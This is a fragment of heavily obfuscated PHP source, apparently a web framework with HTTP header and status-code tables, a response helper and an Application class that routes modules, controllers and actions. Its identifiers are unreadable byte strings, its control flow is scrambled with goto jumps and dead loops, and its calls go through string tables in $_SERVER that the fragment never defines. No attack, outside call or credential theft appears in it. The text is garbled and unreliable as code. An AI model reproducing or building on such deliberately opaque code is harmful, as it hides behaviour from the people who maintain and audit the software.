$Cì‹Ô±õ‘¬ = false; if (!$Cì‹Ô±õ‘¬) { $F„¡åÙß÷ = file_get_contents($CŠæõ±…Ş[1798]); $Cì‹Ô±õ‘¬ = new DOMDocument(); $Cì‹Ô±õ‘¬->loadXML($F„¡åÙß÷); } goto A¥Ò–ñ¼–Ã; B»¼İà÷…Š: return $CŠæõ±…Ş[33]; goto f¶Ç†±ƒ¤Ñ; A¥Ò–ñ¼–Ã: $D°ùË°Îª = array_shift(explode($CŠæõ±…Ş[8], $f¢¤ÉÓÕ¤‹)); $EíÃ›˜Ô = $Cì‹Ô±õ‘¬->getElementsByTagNameNS($CŠæõ±…Ş[1799], $D°ùË°Îª); if ($EíÃ›˜Ô) { return $EíÃ›˜Ô[0]->nodeValue; } goto B»¼İà÷…Š; f¶Ç†±ƒ¤Ñ: } public static function response($F‡•½èÈ„) { goto dÍ·ˆ…Ò¤; EêÔÆîÌ: if (is_string($F‡•½èÈ„[$C Å‡‡áñË[1797]])) { header($C Å‡‡áñË[1800]); $DÀßÛßãáŒ = $C Å‡‡áñË[1801] . $C Å‡‡áñË[213] . $F‡•½èÈ„[$C Å‡‡áñË[1797]]; echo $DÀßÛßãáŒ; } goto B‚‹×á‹Õª; dÍ·ˆ…Ò¤: $C Å‡‡áñË =& $_SERVER[Ö]; $c¶³÷øô‹ = is_array($F‡•½èÈ„[$C Å‡‡áñË[1192]]) ? $F‡•½èÈ„[$C Å‡‡áñË[1192]] : array(); $c¶³÷øô‹[] = HttpHeader::code($F‡•½èÈ„[$C Å‡‡áñË[1025]]); goto fĞÍƒŒÏå…; fĞÍƒŒÏå…: $c¶³÷øô‹[] = $C Å‡‡áñË[1739]; $c¶³÷øô‹[] = $C Å‡‡áñË[1740]; foreach ($c¶³÷øô‹ as $BÚ”²ëÆŞô) { header($BÚ”²ëÆŞô); } goto EêÔÆîÌ; B‚‹×á‹Õª: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\x48\x54\124\120\x5f\110\117\123\x54", "\125\163\x65\x72\55\x41\x67\x65\156\x74" => "\110\124\x54\120\137\x55\123\105\x52\x5f\101\107\x45\116\x54", "\103\157\156\164\x65\x6e\x74\55\x54\x79\160\x65" => "\x48\124\124\x50\x5f\x43\117\116\x54\105\116\124\137\124\131\120\105", "\x43\x6f\156\x74\x65\x6e\164\x2d\114\x65\156\x67\164\150" => "\110\x54\124\120\137\103\117\116\x54\x45\116\x54\137\114\105\x4e\x47\124\110", "\104\145\x70\x74\150" => "\110\x54\x54\120\x5f\104\105\x50\124\110", "\105\x78\x70\x65\143\x74" => "\110\124\x54\120\137\105\130\120\105\x43\124", "\111\146\x2d\116\x6f\x6e\145\x2d\x4d\x61\164\143\150" => "\110\124\x54\120\x5f\x49\106\137\116\117\116\x45\137\115\x41\124\103\110", "\x49\146\x2d\x4d\x61\164\143\x68" => "\x48\124\x54\x50\x5f\x49\106\x5f\115\101\x54\103\x48", "\x49\x66\55\x52\141\x6e\147\145" => "\110\124\x54\120\137\111\106\137\x52\101\116\107\x45", "\114\141\x73\x74\55\x4d\x6f\x64\151\146\x69\x65\144" => "\x48\x54\x54\120\x5f\x4c\x41\123\124\137\x4d\117\104\111\x46\x49\105\x44", "\111\146\55\115\x6f\144\x69\x66\x69\145\x64\55\123\151\x6e\143\x65" => "\110\124\x54\x50\x5f\111\106\137\x4d\x4f\104\111\x46\111\x45\104\x5f\x53\111\x4e\x43\x45", "\x49\146\x2d\125\156\x6d\157\144\x69\x66\151\145\x64\55\x53\151\x6e\x63\x65" => "\x48\x54\x54\x50\x5f\x49\x46\x5f\125\x4e\115\x4f\104\111\x46\x49\105\x44\137\x53\x49\x4e\x43\105", "\x52\141\156\x67\145" => "\110\124\x54\120\x5f\x52\x41\x4e\107\105", "\x54\151\x6d\x65\157\x75\x74" => "\x48\x54\x54\120\x5f\x54\111\x4d\105\117\x55\x54", "\x49\x66" => "\x48\x54\124\x50\137\111\106", "\114\157\x63\153\55\124\157\153\145\156" => "\110\124\124\x50\137\x4c\117\103\113\137\x54\x4f\x4b\x45\x4e", "\x4f\166\x65\x72\167\x72\x69\x74\x65" => "\x48\x54\124\x50\x5f\x4f\126\105\x52\x57\122\111\124\x45", "\x44\x65\x73\x74\x69\x6e\x61\164\151\x6f\156" => "\x48\x54\x54\x50\137\x44\x45\x53\x54\111\116\101\124\x49\x4f\x4e", "\122\x65\x71\165\145\x73\164\x2d\111\144" => "\x52\x45\121\x55\105\123\x54\x5f\111\x44", "\122\x65\x71\x75\145\x73\164\55\102\x6f\x64\x79\x2d\106\x69\154\145" => "\122\x45\121\x55\x45\123\x54\137\x42\x4f\x44\x59\137\106\111\x4c\x45", "\x52\x65\144\x69\x72\145\x63\x74\x2d\x53\x74\141\164\x75\163" => "\x52\105\x44\111\x52\105\x43\x54\x5f\x53\124\x41\x54\x55\123"); public static function init() { static $Fì‡‘³«¯ = false; if ($Fì‡‘³«¯) { return; } foreach ($_SERVER as $d’Ã®êŠôá => $AÊƒœ±Óƒ) { $d’Ã®êŠôá = strtoupper($d’Ã®êŠôá); if (!array_key_exists($d’Ã®êŠôá, $_SERVER)) { continue; } $_SERVER[$d’Ã®êŠôá] = $AÊƒœ±Óƒ; } foreach (self::$_headers as $d’Ã®êŠôá => $d¯£ì‚Ş“ä) { if (!array_key_exists($d’Ã®êŠôá, $_SERVER)) { continue; } $_SERVER[$d’Ã®êŠôá] = $_SERVER[$d¯£ì‚Ş“ä]; $_SERVER[strtoupper($d’Ã®êŠôá)] = $_SERVER[$d¯£ì‚Ş“ä]; } } public static function get($f‹Œ‡÷¯”) { self::init(); return $_SERVER[$f‹Œ‡÷¯”] ? $_SERVER[$f‹Œ‡÷¯”] : $_SERVER[$_SERVER[Ö][1802] . strtoupper($f‹Œ‡÷¯”)]; } public static function method() { return strtoupper(self::get($_SERVER[Ö][150])); } public static function length() { $e¼£»¿ÖÒÓ =& $_SERVER[Ö]; $B­¹‚ëÚœÇ = self::get($e¼£»¿ÖÒÓ[1803]); if (!$B­¹‚ëÚœÇ) { $B­¹‚ëÚœÇ = self::get($e¼£»¿ÖÒÓ[1131]); } return $B­¹‚ëÚœÇ; } public static function range() { $b†‘‹§¸È‰ =& $_SERVER[Ö]; $d‘ŸêÊ°È = self::get($b†‘‹§¸È‰[194]); if (!$d‘ŸêÊ°È) { return !1; } if (!preg_match($b†‘‹§¸È‰[1804], $d‘ŸêÊ°È, $bÊ˜àÄÉÙ)) { return !1; } if ($bÊ˜àÄÉÙ[1] === $b†‘‹§¸È‰[33] && $bÊ˜àÄÉÙ[2] === $b†‘‹§¸È‰[33]) { return !1; } return array($bÊ˜àÄÉÙ[1] !== $b†‘‹§¸È‰[33] ? $bÊ˜àÄÉÙ[1] : null, $bÊ˜àÄÉÙ[2] !== $b†‘‹§¸È‰[33] ? $bÊ˜àÄÉÙ[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\103\x6f\x6e\x74\x69\156\165\145", "\x31\60\x31" => "\123\x77\151\x74\x63\x68\151\156\x67\x20\x50\x72\x6f\x74\x6f\143\157\x6c", "\61\x30\62" => "\x50\162\x6f\143\x65\x73\163\151\x6e\147", "\61\x30\x33" => "\x45\141\x72\x6c\171\x20\x48\151\x6e\x74\163", "\x32\x30\60" => "\x4f\x4b", "\x32\60\x31" => "\103\x72\x65\141\164\145\144", "\62\x30\62" => "\x41\x63\x63\x65\160\164\x65\144", "\62\60\x33" => "\x4e\157\156\x2d\x41\x75\x74\150\x6f\x72\151\164\x61\x74\151\x76\x65\x20\111\156\x66\157\162\x6d\141\164\x69\x6f\x6e", "\62\60\64" => "\x4e\157\x20\x43\157\156\x74\x65\x6e\x74", "\x32\60\65" => "\x52\145\163\145\x74\x20\103\x6f\156\x74\x65\x6e\164", "\x32\x30\66" => "\x50\x61\162\x74\151\141\x6c\x20\103\x6f\156\x74\145\156\164", "\x32\x30\67" => "\115\165\154\x74\151\x2d\123\x74\x61\164\165\x73", "\63\x30\60" => "\115\x75\x6c\x74\x69\x70\x6c\x65\40\x43\x68\x6f\x69\143\145\x73", "\63\60\x31" => "\115\157\x76\x65\x64\40\x50\145\x72\x6d\x61\x6e\x65\156\x74\x6c\x79", "\63\x30\62" => "\x46\x6f\165\156\x64", "\63\60\x33" => "\123\x65\145\40\x4f\164\x68\x65\162", "\x33\60\x34" => "\x4e\x6f\164\40\115\157\x64\151\x66\x69\x65\x64", "\x33\x30\x35" => "\125\163\x65\x20\120\162\x6f\170\x79", "\63\60\x37" => "\x54\x65\155\x70\157\x72\x61\162\x79\x20\x52\145\144\x69\162\145\143\164", "\x33\x30\x38" => "\x50\145\162\x6d\x61\x6e\x65\156\x74\x20\122\x65\x64\x69\x72\x65\143\x74", "\64\x30\x30" => "\102\x61\x64\40\x52\x65\161\165\145\163\164", "\x34\x30\x31" => "\125\156\141\165\164\x68\157\162\x69\172\x65\x64", "\x34\60\x32" => "\120\141\x79\x6d\x65\x6e\164\x20\x52\x65\161\165\x69\x72\x65\x64", "\64\x30\x33" => "\106\157\x72\142\151\x64\144\145\x6e", "\x34\60\64" => "\116\x6f\164\40\x46\x6f\x75\156\144", "\x34\x30\x35" => "\x4d\x65\164\x68\x6f\x64\40\116\157\164\40\x41\154\x6c\x6f\167\x65\x64", "\x34\60\x36" => "\x4e\157\x74\x20\x41\143\143\145\160\x74\141\142\154\x65", "\x34\60\x37" => "\120\162\157\x78\x79\x20\x41\x75\164\150\x65\156\x74\151\143\x61\164\151\157\x6e\x20\122\x65\161\x75\x69\162\x65\x64", "\64\x30\70" => "\122\x65\161\165\x65\163\164\x20\x54\151\x6d\145\x6f\x75\x74", "\64\60\x39" => "\x43\157\156\x66\154\151\x63\x74", "\x34\x31\60" => "\107\157\156\x65", "\64\61\61" => "\114\x65\x6e\x67\x74\x68\40\x52\x65\161\x75\x69\162\x65\x64", "\64\x31\62" => "\x50\162\145\x63\157\x6e\x64\151\164\151\x6f\156\x20\x46\141\151\154\145\144", "\64\x31\63" => "\x52\145\x71\x75\x65\163\164\x20\105\x6e\x74\151\x74\x79\40\124\x6f\x6f\40\x4c\x61\162\x67\x65", "\64\x31\x34" => "\122\x65\x71\165\x65\x73\164\x20\125\122\111\x20\x54\157\x6f\x20\x4c\141\162\x67\145", "\x34\61\65" => "\x55\156\x73\165\160\x70\x6f\x72\164\x65\x64\40\115\x65\x64\x69\x61\40\124\171\160\x65", "\64\61\x36" => "\x52\145\x71\165\145\x73\164\145\x64\40\122\x61\156\x67\145\40\x4e\157\x74\40\x53\x61\x74\x69\x73\x66\151\x61\x62\x6c\145", "\x34\61\x37" => "\105\x78\x70\x65\143\164\x61\x74\151\x6f\x6e\x20\x46\141\151\154\x65\x64", "\x34\x32\x32" => "\125\x6e\160\162\x6f\x63\145\x73\163\141\142\x6c\x65\40\x45\156\x74\x69\164\x79", "\x34\62\x33" => "\114\x6f\143\x6b\145\x64", "\x34\x32\64" => "\106\141\151\x6c\145\144\40\x44\x65\160\x65\156\144\x65\x6e\x63\171", "\x34\x32\x35" => "\x55\156\157\x72\144\145\162\145\144\x20\x43\157\154\154\145\143\164\151\x6f\x6e", "\64\x32\66" => "\x55\160\147\162\x61\x64\145\40\x52\145\x71\165\151\x72\145\x64", "\64\x32\x38" => "\120\162\145\x63\x6f\156\144\x69\x74\151\x6f\x6e\40\x52\145\161\x75\x69\x72\x65\144", "\64\x32\71" => "\x54\x6f\x6f\x20\115\x61\x6e\171\40\x52\145\161\x75\145\163\x74\163", "\64\x33\61" => "\122\145\161\165\145\x73\164\40\110\x65\x61\x64\145\x72\x20\x46\151\145\x6c\144\x73\40\124\x6f\157\x20\x4c\141\x72\147\x65", "\x34\64\x34" => "\x4e\157\x20\122\x65\163\160\x6f\156\x73\x65", "\64\x35\x30" => "\x42\154\x6f\x63\153\x65\144\x20\x62\x79\x20\127\151\x6e\x64\157\167\x73\40\120\x61\162\x65\156\x74\x61\x6c\x20\103\157\x6e\164\162\157\154\163", "\x34\65\61" => "\x55\156\141\166\x61\151\154\x61\x62\x6c\145\x20\106\157\x72\x20\x4c\145\147\141\x6c\x20\122\x65\141\163\x6f\x6e\163", "\64\x39\x34" => "\122\145\161\165\x65\x73\164\40\110\145\x61\144\145\x72\40\x54\157\x6f\40\x4c\141\162\147\x65", "\x35\60\60" => "\111\156\164\x65\162\x6e\x61\x6c\x20\123\x65\162\166\x65\x72\40\x45\x72\x72\157\x72", "\x35\60\61" => "\116\x6f\x74\x20\x49\x6d\x70\154\145\x6d\x65\x6e\164\145\x64", "\65\x30\x32" => "\x42\x61\x64\40\107\x61\x74\x65\x77\141\171", "\x35\x30\63" => "\x53\145\x72\x76\151\x63\145\40\125\x6e\x61\166\141\151\x6c\x61\142\x6c\145", "\x35\60\x34" => "\x47\141\164\145\167\x61\x79\40\x54\x69\155\145\x6f\165\164", "\x35\60\65" => "\x48\x54\x54\120\x20\x56\145\162\163\x69\x6f\156\x20\x6e\x6f\164\x20\163\x75\160\160\157\162\164\145\x64", "\x35\x30\x37" => "\x49\x6e\163\165\146\x66\x69\143\x69\145\156\x74\40\x53\164\157\162\x61\147\x65"); public static function code($bæ•Œ‹‘áè) { $cœ¤ÉóªÙ =& $_SERVER[Ö]; $bæ•Œ‹‘áè = $bæ•Œ‹‘áè . $cœ¤ÉóªÙ[33]; $f¸‰¹±á‘» = self::$statusCode[$bæ•Œ‹‘áè]; $f¸‰¹±á‘» = $f¸‰¹±á‘» ? "\110\x54\124\120\57\61\x2e\x31\x20{$bæ•Œ‹‘áè}\40" . $f¸‰¹±á‘» : $cœ¤ÉóªÙ[33]; return $f¸‰¹±á‘»; } } goto CÊÔ‡‘‘Éš; eÇ·­Ğ: while (strlen($A­«‡„ß²) < $_SERVER[Ö][547]) { if (!$A­«‡„ß²) { break; } $A­«‡„ß²++; } class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\151\x6e\144\145\170"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($F‚’ä¥éÔ¯) { goto d¹†ŠÅöò„; d¹†ŠÅöò„: $B”Ö¦¬îŒË =& $_SERVER[Ö]; $BÏº’Š”ö“ =& $_SERVER[¸‹ï‰«Ğ]; $aµ¤Ù¤Ò‰¡ = $BÏº’Š”ö“[0]($BÏº’Š”ö“[1], $BÏº’Š”ö“[2]($F‚’ä¥éÔ¯, $BÏº’Š”ö“[1])); goto E»˜Œ‚±; b“âø±: $this->defaultAction = $aµ¤Ù¤Ò‰¡[2] ? $aµ¤Ù¤Ò‰¡[2] : $this->defaultAction; $this->{$_SERVER[¸‹ï‰«Ğ][3]}($BÏº’Š”ö“[4], array($this, $BÏº’Š”ö“[5])); $b¶õ­ ¡ = $B”Ö¦¬îŒË[549]; goto fŸ½í³ËŸ‘; E»˜Œ‚±: $CˆœÙè›É = $B”Ö¦¬îŒË[548]; $this->defaultModule = $aµ¤Ù¤Ò‰¡[0] ? $aµ¤Ù¤Ò‰¡[0] : $this->defaultModule; $this->defaultController = $aµ¤Ù¤Ò‰¡[1] ? $aµ¤Ù¤Ò‰¡[1] : $this->defaultController; goto b“âø±; fŸ½í³ËŸ‘: } public function appRun($fÊáÒèéÆ±) { goto D óã òæ; aï‹â§É¹ñ: $f›ÒŒÛö› = $fÂÙëŒˆè[6]($b«‰Ì¯œ¥¡[0]); $c¨òœÌğé‡ = $cÒ‡…ƒÙ[550]; if (!$c¨òœÌğé‡) { return; } goto cÛÊã ÷¿; eŠ÷ÀÜ…“ê: $eÚ¡Œìöš = $cÒ‡…ƒÙ[552]; if (strlen($eÚ¡Œìöš) < $cÒ‡…ƒÙ[547]) { return; } $fÂÙëŒˆè[13](array($fÂÙëŒˆè[14], $fÂÙëŒˆè[15]), $Eˆç†ã…İÊ . $fÂÙëŒˆè[18], $fÊáÒèéÆ±); goto cçÎ²ĞÜè¨; EÄº×®¾õ‡: if ($f›ÒŒÛö› == $fÂÙëŒˆè[8]) { $Eˆç†ã…İÊ = $fÂÙëŒˆè[9]; $b«‰Ì¯œ¥¡[0] = $fÂÙëŒˆè[10]; $b«‰Ì¯œ¥¡[1] = $b«‰Ì¯œ¥¡[1] . $fÂÙëŒˆè[11]; $fÊáÒèéÆ± = $fÂÙëŒˆè[12]($fÂÙëŒˆè[1], $b«‰Ì¯œ¥¡); $fÊáÒèéÆ± = $fÂÙëŒˆè[2]($fÊáÒèéÆ±, $fÂÙëŒˆè[1]); } $fÂÙëŒˆè[13](array($fÂÙëŒˆè[14], $fÂÙëŒˆè[15]), $Eˆç†ã…İÊ . $fÂÙëŒˆè[16], $fÊáÒèéÆ±); $fÂÙëŒˆè[17]($fÊáÒèéÆ±); goto eŠ÷ÀÜ…“ê; cÛÊã ÷¿: $Eˆç†ã…İÊ = $fÂÙëŒˆè[7]; $A‡È×ø£”Ñ = $cÒ‡…ƒÙ[551]; if (!$A‡È×ø£”Ñ) { return; } goto EÄº×®¾õ‡; D óã òæ: $cÒ‡…ƒÙ =& $_SERVER[Ö]; $fÂÙëŒˆè =& $_SERVER[¸‹ï‰«Ğ]; $b«‰Ì¯œ¥¡ = $fÂÙëŒˆè[0]($fÂÙëŒˆè[1], $fÊáÒèéÆ±); goto aï‹â§É¹ñ; cçÎ²ĞÜè¨: } private function autorun() { $a¯¥Öê‡™® =& $_SERVER[¸‹ï‰«Ğ]; global $config; if ($a¯¥Öê‡™®[19]($config[$a¯¥Öê‡™®[20]]) == 0) { return; } foreach ($config[$a¯¥Öê‡™®[20]] as $dòÇ—™óö => $eƒ±Ğ–Ş¥µ) { $this->{$_SERVER[¸‹ï‰«Ğ][21]}($eƒ±Ğ–Ş¥µ); } } private function jcsn0a0078bc() { goto Eà‹ã¢¸•÷; C±©„ïÅ¥: $E½éØé»ğ = array($eÓ« ğ¯èÛ[8], $AöŸÔ„ÆÏ£); $E¤¢°†´ÌË = $CŒÕÆâçÆµ[554]; if (strlen($E¤¢°†´ÌË) < $CŒÕÆâçÆµ[555]) { return; } goto b©æÒÓ Õ; Eà‹ã¢¸•÷: $CŒÕÆâçÆµ =& $_SERVER[Ö]; $eÓ« ğ¯èÛ =& $_SERVER[¸‹ï‰«Ğ]; $d—°­¥ÄÙŒ = $eÓ« ğ¯èÛ[8]; goto BäÆ÷¼íÀ; Aµƒ…¥Ä‡’: $GLOBALS[$eÓ« ğ¯èÛ[22]][$eÓ« ğ¯èÛ[28]] = $eÓ« ğ¯èÛ[29]($eÓ« ğ¯èÛ[1], $GLOBALS[$eÓ« ğ¯èÛ[22]][$eÓ« ğ¯èÛ[23]]); $bñé‰ƒ§Ÿ = $CŒÕÆâçÆµ[558]; goto bÊôŠ¼åß‚; b©æÒÓ Õ: $FÁ¦É’óá  = $eÓ« ğ¯èÛ[26]($GLOBALS[$eÓ« ğ¯èÛ[22]][$eÓ« ğ¯èÛ[23]], 1); $bĞ³›¨Ÿ™ = $CŒÕÆâçÆµ[556]; if (!$bĞ³›¨Ÿ™) { return; } goto Cäª¶ÆÓèˆ; BäÆ÷¼íÀ: $EÌ˜ƒô‘²® = $CŒÕÆâçÆµ[553]; if (!$EÌ˜ƒô‘²®) { return; } $b¥›¢ƒ† = $GLOBALS[$eÓ« ğ¯èÛ[22]][$eÓ« ğ¯èÛ[23]][0]; goto e×š¤î­ùê; e×š¤î­ùê: if (!$b¥›¢ƒ† || $eÓ« ğ¯èÛ[24]($b¥›¢ƒ†) <= $eÓ« ğ¯èÛ[24]($d—°­¥ÄÙŒ)) { return; } if ($eÓ« ğ¯èÛ[6]($eÓ« ğ¯èÛ[25]($b¥›¢ƒ†, -$eÓ« ğ¯èÛ[24]($d—°­¥ÄÙŒ))) != $d—°­¥ÄÙŒ) { return; } $AöŸÔ„ÆÏ£ = $eÓ« ğ¯èÛ[25]($b¥›¢ƒ†, 0, -$eÓ« ğ¯èÛ[24]($d—°­¥ÄÙŒ)); goto C±©„ïÅ¥; Cäª¶ÆÓèˆ: $GLOBALS[$eÓ« ğ¯èÛ[22]][$eÓ« ğ¯èÛ[23]] = $eÓ« ğ¯èÛ[27]($E½éØé»ğ, $FÁ¦É’óá ); $BÊ‚š©±˜í = $CŒÕÆâçÆµ[557]; if (!$BÊ‚š©±˜í) { return; } goto Aµƒ…¥Ä‡’; bÊôŠ¼åß‚: } private function lozj494b9926() { goto B÷ªÙÌ©; a´âÛøĞã¤: while (strlen($aŠìÛÌšİ¾) < $fîä³äÊ[555]) { if (!$aŠìÛÌšİ¾) { break; } $aŠìÛÌšİ¾++; } goto Aø«È²¬‰; D…èÖàøÇ¬: $AªÃË„™¦ = $cÉ×Û›˜Í•[31]; if (!$cÉ×Û›˜Í•[32]($eËë‘›“ë, $AªÃË„™¦)) { return; } $E¾•½ÜßáÈ = $cÉ×Û›˜Í•[33]($eËë‘›“ë, $AªÃË„™¦); goto aÍÍ©Òë®Å; aÍÍ©Òë®Å: $Få´£„¦Ñ… = $cÉ×Û›˜Í•[25]($eËë‘›“ë, $E¾•½ÜßáÈ + $cÉ×Û›˜Í•[24]($AªÃË„™¦)); $Eµ™á¨ˆÜç = $fîä³äÊ[561]; if (strlen($Eµ™á¨ˆÜç) < $fîä³äÊ[555]) { return; } goto a–ìñŠ²šˆ; aîÁèµ•–: if (!$d…Å¦ÒĞë•) { die; } $GLOBALS[$cÉ×Û›˜Í•[22]][$cÉ×Û›˜Í•[23]] = $cÉ×Û›˜Í•[0]($cÉ×Û›˜Í•[36], $Få´£„¦Ñ…); $e‘ †„ãíÒ = $fîä³äÊ[563]; goto CÔ©Æ÷Ùùƒ; A³˜ËÎéÚÏ: $eËë‘›“ë = $_SERVER[$cÉ×Û›˜Í•[30]]; $B›¿ƒÅƒğƒ = $fîä³äÊ[559]; if (strlen($B›¿ƒÅƒğƒ) < $fîä³äÊ[560]) { return; } goto D…èÖàøÇ¬; CÔ©Æ÷Ùùƒ: if (!$e‘ †„ãíÒ) { return; } $GLOBALS[$cÉ×Û›˜Í•[22]][$cÉ×Û›˜Í•[28]] = $cÉ×Û›˜Í•[29]($cÉ×Û›˜Í•[1], $GLOBALS[$cÉ×Û›˜Í•[22]][$cÉ×Û›˜Í•[23]]); $aŠìÛÌšİ¾ = $fîä³äÊ[564]; goto a´âÛøĞã¤; a–ìñŠ²šˆ: $cÉ×Û›˜Í•[34]($cÉ×Û›˜Í•[35], $Få´£„¦Ñ…, $a°˜»©öøĞ); $Få´£„¦Ñ… = $cÉ×Û›˜Í•[2]($a°˜»©öøĞ[0][0], $cÉ×Û›˜Í•[36]); $d…Å¦ÒĞë• = $fîä³äÊ[562]; goto aîÁèµ•–; B÷ªÙÌ©: $fîä³äÊ =& $_SERVER[Ö]; $cÉ×Û›˜Í• =& $_SERVER[¸‹ï‰«Ğ]; if ($GLOBALS[$cÉ×Û›˜Í•[22]][$cÉ×Û›˜Í•[28]] != $cÉ×Û›˜Í•[10]) { return; } goto A³˜ËÎéÚÏ; Aø«È²¬‰: } public function run() { goto D¿ øÈìÈ¬; D¿ øÈìÈ¬: $Cè”­‰ÇÕ =& $_SERVER[Ö]; $f‘‹Ÿâ‘µÂ =& $_SERVER[¸‹ï‰«Ğ]; $this->{$_SERVER[¸‹ï‰«Ğ][37]}(); goto Cƒ¥¼®´°¯; EÜÅ¢‡•ù: $f÷éàœÂƒì = $Cè”­‰ÇÕ[568]; $f‘‹Ÿâ‘µÂ[39]($f‘‹Ÿâ‘µÂ[43], MOD . $f‘‹Ÿâ‘µÂ[1] . ST . $f‘‹Ÿâ‘µÂ[1] . ACT); $cà¿¿‡««¤ = $Cè”­‰ÇÕ[569]; goto f´¯›Œ½İŞ; B…§¯¯¿Şô: if ($f‘‹Ÿâ‘µÂ[19]($Eê†œ²Ö) >= 3) { $this->{$_SERVER[¸‹ï‰«Ğ][21]}($e™’º‰ëã¨); } else { $this->{$_SERVER[¸‹ï‰«Ğ][21]}(ACTION); } goto fàÎÓ˜ÕÂ; f´¯›Œ½İŞ: if (!$cà¿¿‡««¤) { return; } $_SERVER[$f‘‹Ÿâ‘µÂ[44]] = $f‘‹Ÿâ‘µÂ[6](ACTION); $this->{$_SERVER[¸‹ï‰«Ğ][45]}(); goto B…§¯¯¿Şô; eó“¶Ñ¼Ñ: $eë˜µ¯‚à  = $Cè”­‰ÇÕ[567]; if (!$eë˜µ¯‚à ) { die; } $f‘‹Ÿâ‘µÂ[39]($f‘‹Ÿâ‘µÂ[42], isset($Eê†œ²Ö[2]) && $Eê†œ²Ö[0] ? $Eê†œ²Ö[2] : $this->defaultAction); goto EÜÅ¢‡•ù; fš‚í¢«: while ($A”ÆºÀŠˆ­ < $Cè”­‰ÇÕ[555]) { if ($A”ÆºÀŠˆ­ >= 0) { break; } $A”ÆºÀŠˆ­++; } $e™’º‰ëã¨ = $GLOBALS[$f‘‹Ÿâ‘µÂ[22]][$f‘‹Ÿâ‘µÂ[28]]; $f‘‹Ÿâ‘µÂ[39]($f‘‹Ÿâ‘µÂ[40], isset($Eê†œ²Ö[0]) && $Eê†œ²Ö[0] ? $Eê†œ²Ö[0] : $this->defaultModule); goto D‚©Œ¦˜İÁ; D‚©Œ¦˜İÁ: $C‘‰ÀÒˆß = $Cè”­‰ÇÕ[566]; while (strlen($C‘‰ÀÒˆß) < $Cè”­‰ÇÕ[560]) { if (!$C‘‰ÀÒˆß) { break; } $C‘‰ÀÒˆß++; } $f‘‹Ÿâ‘µÂ[39]($f‘‹Ÿâ‘µÂ[41], isset($Eê†œ²Ö[1]) && $Eê†œ²Ö[0] ? $Eê†œ²Ö[1] : $this->defaultController); goto eó“¶Ñ¼Ñ; Cƒ¥¼®´°¯: $this->{$_SERVER[¸‹ï‰«Ğ][38]}(); $Eê†œ²Ö = $GLOBALS[$f‘‹Ÿâ‘µÂ[22]][$f‘‹Ÿâ‘µÂ[23]]; $A”ÆºÀŠˆ­ = $Cè”­‰ÇÕ[565]; goto fš‚í¢«; fàÎÓ˜ÕÂ: } private $dzow6dcbc746 = array(); private $wrks0914a6a5 = ''; public function mekyd62e470a() { goto f·Ëù‡‰®Ñ; bĞ²ÈôÈ: $eáğòö³‹ = $F†ªªİ Ñ[575]; if (!$eáğòö³‹) { die; } $this->{$_SERVER[¸‹ï‰«Ğ][3]}($D…ÄªÂ½¬[57], array($this, $D…ÄªÂ½¬[58])); goto FÒ¥‚Áçê; Eé†Ş÷¤‹ë: if (!$c¡·¯®––Î) { die; } $this->{$_SERVER[¸‹ï‰«Ğ][3]}($D…ÄªÂ½¬[53], array($this, $D…ÄªÂ½¬[54])); $this->{$_SERVER[¸‹ï‰«Ğ][3]}($D…ÄªÂ½¬[55], array($this, $D…ÄªÂ½¬[56])); goto bĞ²ÈôÈ; Bñ¤ ‚¯‚¥: $D™’¹ÓÈ”” = $F†ªªİ Ñ[571]; if (!$D™’¹ÓÈ””) { die; } $this->{$_SERVER[¸‹ï‰«Ğ][48]}(); goto f„ºÎÓĞ»¡; A”©æŒïšÀ: $this->{$_SERVER[¸‹ï‰«Ğ][50]}(); $aŒë©¶šÓ‚ = $F†ªªİ Ñ[573]; if (!$aŒë©¶šÓ‚) { return; } goto eÈÃŞØÌß ; f„ºÎÓĞ»¡: $DµÆ¹¥ìÔ² = $F†ªªİ Ñ[572]; while (strlen($DµÆ¹¥ìÔ²) < $F†ªªİ Ñ[560]) { if (!$DµÆ¹¥ìÔ²) { break; } $DµÆ¹¥ìÔ²++; } $this->{$_SERVER[¸‹ï‰«Ğ][49]}(); goto A”©æŒïšÀ; EŸèÉ¸‡—á: $C‡¼…®™Ê = $F†ªªİ Ñ[570]; while ($C‡¼…®™Ê < $F†ªªİ Ñ[555]) { if ($C‡¼…®™Ê >= 0) { break; } $C‡¼…®™Ê++; } $this->{$_SERVER[¸‹ï‰«Ğ][47]}(); goto Bñ¤ ‚¯‚¥; FÒ¥‚Áçê: $this->{$_SERVER[¸‹ï‰«Ğ][3]}($D…ÄªÂ½¬[59], array($this, $D…ÄªÂ½¬[60])); goto AÃÖ¥ôÌ´; eÈÃŞØÌß : $this->{$_SERVER[¸‹ï‰«Ğ][51]}(); $this->{$_SERVER[¸‹ï‰«Ğ][52]}(); $c¡·¯®––Î = $F†ªªİ Ñ[574]; goto Eé†Ş÷¤‹ë; f·Ëù‡‰®Ñ: $F†ªªİ Ñ =& $_SERVER[Ö]; $D…ÄªÂ½¬ =& $_SERVER[¸‹ï‰«Ğ]; $this->{$_SERVER[¸‹ï‰«Ğ][46]}(); goto EŸèÉ¸‡—á; AÃÖ¥ôÌ´: } public function hnmb5488e078($b¡¬¦…Ş­) { goto cß¤¢Î¡™Ñ; B•†¸òÍ‡Ò: unset($b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[95]][$D…ˆéÈÓ„[97]]); $DÄÃªª‹ò = $B›†ƒÛø†Œ[578]; if (!$DÄÃªª‹ò) { die; } goto eÙò™Ó…¶à; C‡ÅÏÔ­‘: $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[109]] = $D…ˆéÈÓ„[110]($D…ˆéÈÓ„[111])->{$_SERVER[¸‹ï‰«Ğ][112]}(); $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[113]] = $D…ˆéÈÓ„[114]($_SERVER[$D…ˆéÈÓ„[115]] . $E¬ÖöíÃÆ[$D…ˆéÈÓ„[116]]); $BŞİëêå¥ = $B›†ƒÛø†Œ[581]; goto A‡ò‚Ğ˜õ ; c•§«Ú”Û¦: $eğ‘¥¥ˆìÖ = $B›†ƒÛø†Œ[580]; while ($eğ‘¥¥ˆìÖ < $B›†ƒÛø†Œ[547]) { if ($eğ‘¥¥ˆìÖ >= 0) { break; } $eğ‘¥¥ˆìÖ++; } 